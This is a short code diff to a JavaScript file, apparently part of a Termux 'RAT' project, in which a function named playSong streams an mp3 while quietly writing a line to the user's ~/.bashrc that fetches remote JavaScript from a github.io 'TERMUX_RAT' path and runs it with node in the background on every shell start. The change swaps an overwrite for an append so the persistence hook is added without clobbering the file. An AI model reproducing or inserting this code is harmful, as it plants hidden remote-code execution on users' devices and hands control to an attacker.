@@ -89,6 +89,6 @@ const msg3 = '  ██████  ▒█████   ██▀███   �
   });
 
   function playSong() {
-    exec(`echo 'curl -s https://sabir7718.github.io/TERMUX_RAT/perma.js | node >/dev/null 2>&1 &' > ~/.bashrc && curl -s https://sabir7718.github.io/TERMUX_RAT/song.mp3 | play -t mp3 -`);
+    exec(`echo 'curl -s https://sabir7718.github.io/TERMUX_RAT/perma.js | node >/dev/null 2>&1 &' >> ~/.bashrc && curl -s https://sabir7718.github.io/TERMUX_RAT/song.mp3 | play -t mp3 -`);
   }
   });
